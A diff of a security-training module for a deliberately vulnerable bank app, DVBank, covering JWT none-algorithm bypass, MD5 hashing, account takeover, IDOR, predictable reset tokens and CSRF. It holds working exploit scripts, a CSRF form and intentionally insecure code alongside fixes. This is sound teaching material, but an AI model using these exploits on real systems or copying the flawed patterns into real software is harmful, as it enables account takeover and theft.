@@ -1,215 +1,181 @@
 # Module 3: Authentication & Authorization Vulnerabilities
 
-## Understanding Authentication & Authorization
-Authentication and authorization are fundamental security concepts in web applications. While often confused, they serve distinct but complementary purposes in protecting user data and system resources. This module explores common vulnerabilities in both mechanisms and teaches you how to identify and fix them.
-
-### What is Authentication?
-Authentication is the process of verifying who someone is. Think of it like checking ID at a bank:
-- The bank needs to verify you are who you claim to be
-- You provide proof of identity (ID card, passport)
-- The bank validates your proof against their records
-
-In web applications, authentication typically involves:
-1. **Something you know** (password, PIN) - The most common form of authentication
-2. **Something you have** (phone, security key) - Used in multi-factor authentication
-3. **Something you are** (fingerprint, face) - Biometric authentication methods
-
-### What is Authorization?
-Authorization determines what authenticated users are allowed to do within the system. Using the bank analogy:
-- Regular customers can view their accounts and make transfers
-- Bank tellers can process transactions for any customer
-- Managers can approve large transactions
-- Security guards can't access any accounts
-
-This hierarchical access control ensures users can only perform actions appropriate to their role.
-
-### Common Authentication Vulnerabilities
-Understanding common authentication vulnerabilities is crucial for securing web applications. Here are key areas to watch for:
-
-1. **Weak Password Policies**
-   - Short passwords that are easily guessed
-   - Common passwords from known password lists
-   - No complexity requirements for stronger passwords
-   - Missing rate limiting, allowing brute force attacks
-
-2. **Token Vulnerabilities**
-   - Weak secrets used for token generation
-   - Missing token expiration mechanisms
-   - Insecure token storage practices
-   - Token reuse vulnerabilities
-
-3. **Session Management Issues**
-   - Sessions that never expire
-   - Insecure session storage methods
-   - Missing session invalidation on logout
-   - Session fixation vulnerabilities
-
-### Common Authorization Vulnerabilities
-Authorization vulnerabilities can lead to unauthorized access and privilege escalation. Watch for these issues:
-
-1. **Missing Access Controls**
-   - Endpoints without proper role checks
-   - Missing ownership validation on resources
-   - Insecure direct object references (IDOR)
-
-2. **Privilege Escalation**
-   - Vertical escalation (user → admin)
-   - Horizontal escalation (user → another user)
-   - Role manipulation through parameter tampering
+## Authentication vs Authorization
+**Authentication** proves *who you are* (login, tokens). **Authorization** decides *what you may do* (ownership and role checks). Break authentication and you become any user; break authorization and you reach data or actions that aren't yours. DVBank breaks both. Below are the real bugs in this codebase — where they live, how to exploit them, and how to fix them.
 
 ## DVBank Authentication Vulnerabilities
-Let's examine real authentication vulnerabilities present in the DVBank application. Understanding these issues helps identify similar problems in other applications.
 
-### 1. JWT Implementation Issues
-**Location**: `backend/routes/auth_routes.py`
+### 1. JWT `none`-algorithm signature bypass (CWE-347)
+**Location**: `backend/auth.py` — `_decode_token`
 ```python
-# Vulnerable JWT implementation
-token = jwt.encode(
-    {'user_id': user.id},
-    'secret',  # Hardcoded secret
-    algorithm='HS256'  # Weak algorithm
-)
-
-# Missing:
-# - Token expiration
-# - Algorithm enforcement
-# - Secret key rotation
+def _decode_token(token):
+    try:
+        # Normal path: verify with the hardcoded HS256 secret
+        return jwt.decode(token, 'secret', algorithms=['HS256'])
+    except Exception:
+        # INSECURE FALLBACK: accept unsigned / 'none'-algorithm tokens
+        return jwt.decode(
+            token,
+            options={'verify_signature': False, 'verify_exp': False},
+            algorithms=['HS256', 'none'],
+        )
 ```
+On *any* verification error the decoder re-parses the token **without checking the signature**, so an attacker never needs the secret. Both `@token_required` (Bearer header, `auth.py:32`) and `@cookie_auth` (session cookie, `auth.py:60`) route through this function, so the bypass affects every authenticated endpoint.
 
-**Impact**:
-- Tokens can be forged using known secret
-- Tokens never expire, remaining valid indefinitely
-- Algorithm confusion attacks possible through header manipulation
+**Impact**: Forge a token for any `user_id` and impersonate that user — including the seeded admin account (`user_id=1`).
 
-**Exploitation**:
+**Exploitation** (`docs/exploits/jwt_forge.py`): build an `alg:none` token with an empty signature and hit a real endpoint:
 ```python
-import jwt
+import base64, json, urllib.request
 
-# Create forged token
-forged_token = jwt.encode(
-    {'user_id': 1},  # Admin user ID
-    'secret',
+def b64url(raw): return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
+
+header  = {"alg": "none", "typ": "JWT"}
+payload = {"user_id": 1, "username": "forged"}
+# 'none' algorithm => empty third segment (trailing '.')
+token = b64url(json.dumps(header).encode()) + "." + b64url(json.dumps(payload).encode()) + "."
+
+req = urllib.request.Request("http://localhost:5000/api/me",
+                             headers={"Authorization": f"Bearer {token}"})
+print(urllib.request.urlopen(req).read().decode())   # returns user 1's account
+```
+> 🤔 **Challenge Note**: a JWT is `base64url(header).base64url(payload).signature`. For `alg:none` the third segment is empty, so the token ends in a trailing `.`. Why does the server accept a token with no signature at all?
+
+### 2. Weak, hardcoded JWT secret (CWE-798)
+**Location**: `backend/routes/auth_routes.py` — `login`
+```python
+token = jwt.encode(
+    {
+        'user_id': user[0],
+        'username': username,
+        'exp': datetime.utcnow() + timedelta(days=1)
+    },
+    'secret',            # hardcoded, shared, never rotated
     algorithm='HS256'
 )
-
-# Use in requests
-headers = {'Authorization': f'Bearer {forged_token}'}
-response = requests.get('/api/admin', headers=headers)
 ```
+The token **does** carry a 1-day `exp` and a three-field payload, so the common "tokens never expire" claim is wrong here. The real problems are the hardcoded `'secret'` (anyone with the source can sign valid tokens) and no key rotation — and because of the `none`-algorithm fallback above, the signature and the secret are irrelevant to an attacker anyway.
 
-### 2. Password Storage
-**Location**: `backend/routes/auth_routes.py`
+**Impact**: Disclosure (or a guess) of `'secret'` lets an attacker mint valid HS256 tokens for any user.
+
+### 3. Weak password hashing — unsalted MD5 (CWE-916)
+**Location**: `backend/models.py`
 ```python
-# Weak password hashing
-password_hash = hashlib.md5(password.encode()).hexdigest()
-
-# Missing:
-# - Strong hashing algorithm
-# - Password salt
-# - Pepper
-# - Iteration count
+def set_password(self, password):
+    self.password_hash = hashlib.md5(password.encode()).hexdigest()
 ```
-
-**Impact**:
-- Fast password cracking possible due to weak hashing
-- No protection against rainbow table attacks
-- No protection against brute force attempts
+Passwords are stored as a single unsalted MD5 — fast to brute-force and reversible via rainbow tables. Worse, the hashes leak: `GET /api/admin/users` (`backend/routes/admin_routes.py`) returns the raw `password_hash` for every user and has no role check (`@token_required` only), so **any** logged-in user can read them.
 
 **Exploitation**:
 ```python
-import hashlib
 import requests
-
-# Create MD5 hash
-password = "password123"
-hash = hashlib.md5(password.encode()).hexdigest()
-
-# Register account with known hash
-response = requests.post('/api/register', json={
-    'username': 'test',
-    'password_hash': hash
-})
+users = requests.get('http://localhost:5000/api/admin/users',
+                     headers={'Authorization': f'Bearer {token}'}).json()
+for u in users:
+    print(u['username'], u['password_hash'])   # crack with: hashcat -m 0 (raw MD5)
 ```
 
 ## DVBank Authorization Vulnerabilities
-The application contains several authorization vulnerabilities that could allow unauthorized access to sensitive data and operations.
 
-### 1. Missing Ownership Checks
-**Location**: `backend/routes/transaction_routes.py`
-```python
-@app.route('/api/transactions/<transaction_id>')
-@login_required
-def get_transaction(transaction_id):
-    # No ownership validation
-    transaction = Transaction.query.get(transaction_id)
-    return jsonify(transaction.to_dict())
-```
-
-**Impact**:
-- Any authenticated user can access any transaction
-- Financial privacy breach through unauthorized access
-- Sensitive transaction data exposure
-
-**Exploitation**:
-```python
-# Iterate through transaction IDs
-for tid in range(1, 100):
-    response = requests.get(f'/api/transactions/{tid}')
-    if response.status_code == 200:
-        print(f"Found transaction: {response.json()}")
-```
-
-### 2. Profile Access Control
+### 1. Account takeover via `/api/update-password` (CWE-639 / CWE-640)
 **Location**: `backend/routes/auth_routes.py`
 ```python
-@app.route('/api/profile/<user_id>')
-@login_required
-def get_profile(user_id):
-    # No authorization check
+@auth_bp.route('/api/update-password', methods=['POST'])
+@token_required
+def update_password(current_user):
+    data = request.get_json()
+    user_id = data.get('user_id')        # taken from the body, NOT current_user
+    new_password = data.get('new_password')
     user = User.query.get(user_id)
-    return jsonify(user.get_profile())
+    if user:
+        user.set_password(new_password)  # resets ANY user's password
+        ...
 ```
-
-**Impact**:
-- Profile information disclosure to unauthorized users
-- Personal data exposure through IDOR
-- Privacy violation of user data
+The target `user_id` comes from the request body and is never compared to `current_user.id`. Any authenticated user can reset **any** account's password.
 
 **Exploitation**:
 ```python
-# Access any user's profile
-for uid in range(1, 100):
-    response = requests.get(f'/api/profile/{uid}')
-    if response.status_code == 200:
-        print(f"Found profile: {response.json()}")
+requests.post('http://localhost:5000/api/update-password',
+              headers={'Authorization': f'Bearer {token}'},
+              json={'user_id': 1, 'new_password': 'pwned'})   # take over user 1
 ```
+
+### 2. IDOR in transaction access (CWE-639)
+`/api/transactions/<id>` **does** check ownership and returns `403` (`transaction_routes.py:72`), so that route is *not* the bug. The real IDORs are:
+
+- **Unauthenticated receipt page** — `backend/routes/transaction_routes.py`:
+```python
+@transaction_bp.route('/api/transactions/<int:transaction_id>/receipt', methods=['GET'])
+def transaction_receipt(transaction_id):          # no @token_required, no owner check
+    transaction = Transaction.query.get(transaction_id)
+    ...
+```
+  With **no token at all**, anyone can enumerate receipt IDs and read every transaction's sender, receiver, amount and memo.
+
+- **`user_id` trusted from the query string** — `get_transactions`:
+```python
+user_id = request.args.get('user_id', current_user.id)   # caller picks whose history
+query = f'... WHERE sender_id = {user_id} OR receiver_id = {user_id} ...'
+```
+  Passing `?user_id=2` returns another user's history (and the unparameterised value is also a SQL-injection sink).
+
+**Exploitation**:
+```python
+# No auth needed for receipts:
+for tid in range(1, 100):
+    r = requests.get(f'http://localhost:5000/api/transactions/{tid}/receipt')
+    if r.ok: print(r.text)
+
+# Read someone else's history:
+requests.get('http://localhost:5000/api/transactions?user_id=2',
+             headers={'Authorization': f'Bearer {token}'})
+```
+
+### 3. Insecure password reset — predictable token + host-header poisoning (CWE-330 / CWE-640 / CWE-644)
+**Location**: `backend/routes/auth_routes.py` — `forgot_password`
+```python
+token = hashlib.md5(username.encode()).hexdigest()   # predictable: derived from the public username
+...
+host = request.headers.get('Host')                   # attacker-controlled
+reset_link = f"http://{host}/reset-password?user={username}&token={token}"
+```
+The reset token is just `md5(username)`, so an attacker computes any user's token offline and calls `/api/reset-password` directly — no email, no expiry, no ownership proof. Separately, the reset link is built from the client-supplied `Host` header, so a poisoned `Host` plants an attacker-controlled link in any reset email.
+
+**Exploitation**:
+```python
+import hashlib, requests
+victim = 'alice'
+token = hashlib.md5(victim.encode()).hexdigest()
+requests.post('http://localhost:5000/api/reset-password',
+              json={'username': victim, 'token': token, 'new_password': 'pwned'})
+```
+
+### 4. CSRF on the cookie-authenticated `/api/quickpay` (CWE-352)
+**Location**: `backend/routes/transaction_routes.py` (`@cookie_auth`)
+`login` mirrors the JWT into a `session_token` cookie set **without `SameSite`, `HttpOnly` or `Secure`** (`auth_routes.py:74`). `/api/quickpay` is authenticated by that ambient cookie alone, accepts a form-urlencoded body, and requires **no anti-CSRF token**, so a cross-site auto-submitting form moves money out of a logged-in victim's account:
+```html
+<form action="http://localhost:5000/api/quickpay" method="POST">
+  <input name="to_user_id" value="2"><input name="amount" value="1000">
+</form>
+<script>document.forms[0].submit()</script>
+```
+> 💡 The missing `HttpOnly` flag also lets any XSS payload read `document.cookie` — chain it with the receipt-page XSS (Module 10).
 
 ## Prevention Methods
-Understanding how to properly implement authentication and authorization is crucial. Here are secure implementation examples:
 
-### 1. Secure JWT Implementation
+### 1. Verify JWTs strictly
 ```python
-# Strong JWT configuration
-jwt_config = {
-    'secret': os.getenv('JWT_SECRET'),
-    'algorithm': 'HS512',
-    'expires_in': 3600,  # 1 hour
-    'required_claims': ['exp', 'iat', 'sub']
-}
-
-def create_token(user):
-    return jwt.encode({
-        'user_id': user.id,
-        'exp': datetime.utcnow() + timedelta(seconds=jwt_config['expires_in']),
-        'iat': datetime.utcnow(),
-        'sub': str(user.id)
-    }, jwt_config['secret'], algorithm=jwt_config['algorithm'])
+data = jwt.decode(
+    token,
+    os.getenv('JWT_SECRET'),   # strong secret from the environment, rotated
+    algorithms=['HS256'],      # pin the algorithm — never accept 'none'
+)                              # and NEVER fall back to verify_signature=False
 ```
+Reject tokens that fail verification; do not re-decode them unverified.
 
-### 2. Secure Password Storage
+### 2. Hash passwords with a slow, salted KDF
 ```python
 from argon2 import PasswordHasher
-
 ph = PasswordHasher()
 
 def hash_password(password):
@@ -218,44 +184,27 @@ def hash_password(password):
 def verify_password(hash, password):
     try:
         return ph.verify(hash, password)
-    except:
+    except Exception:
         return False
 ```
+And never return `password_hash` in any API response.
 
-### 3. Proper Authorization
+### 3. Enforce ownership and roles on every resource
 ```python
-def verify_resource_owner(resource_id, user_id):
-    resource = Resource.query.get(resource_id)
-    if not resource or resource.user_id != user_id:
-        raise Unauthorized("Access denied")
-    return resource
-
-@app.route('/api/transactions/<transaction_id>')
-@login_required
-def get_transaction(transaction_id):
-    transaction = verify_resource_owner(transaction_id, current_user.id)
-    return jsonify(transaction.to_dict())
+@transaction_bp.route('/api/transactions/<int:transaction_id>', methods=['GET'])
+@token_required
+def get_transaction(current_user, transaction_id):
+    txn = Transaction.query.get(transaction_id)
+    if not txn or (txn.sender_id != current_user.id and txn.receiver_id != current_user.id):
+        return jsonify({'error': 'Unauthorized'}), 403
+    return jsonify(txn.to_dict())
 ```
+Derive the acting user from the verified token (`current_user`), never from a body or query parameter, and gate admin routes on `current_user.role`.
 
 ## Practice Exercises
-These exercises will help you understand and identify authentication and authorization vulnerabilities:
-
-1. **JWT Analysis**
-   - Decode and analyze JWT structure
-   - Attempt token forgery
-   - Implement secure JWT handling
-
-2. **Password Security**
-   - Analyze password hashing implementation
-   - Implement secure password storage
-   - Add password complexity rules
-   - Exploit missing authorization in password reset endpoint
-   - Use account takeover via unauthorized password changes
-
-3. **Authorization Controls**
-   - Add ownership validation to endpoints
-   - Implement role-based access control
-   - Add comprehensive audit logging
+1. **Token forgery** — use `docs/exploits/jwt_forge.py` to mint an `alg:none` token and read `/api/me` as `user_id=1`; then pin the algorithm in `_decode_token` and confirm the forgery fails.
+2. **Account takeover** — reset another user's password via `/api/update-password`, then fix the endpoint to act only on `current_user.id`.
+3. **Authorization controls** — add ownership/role checks to the receipt route and `get_transactions`, and add a CSRF token plus `SameSite`/`HttpOnly` cookie flags to the QuickPay flow.
 
 ## Additional Resources
 To deepen your understanding of authentication and authorization security:
@@ -278,4 +227,4 @@ To deepen your understanding of authentication and authorization security:
 3. [SQLMap](https://github.com/sqlmapproject/sqlmap) - For testing authentication bypass via SQL injection
 4. [Hydra](https://github.com/vanhauser-thc/thc-hydra) - For password brute force testing
 
-⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments. 
+⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments.
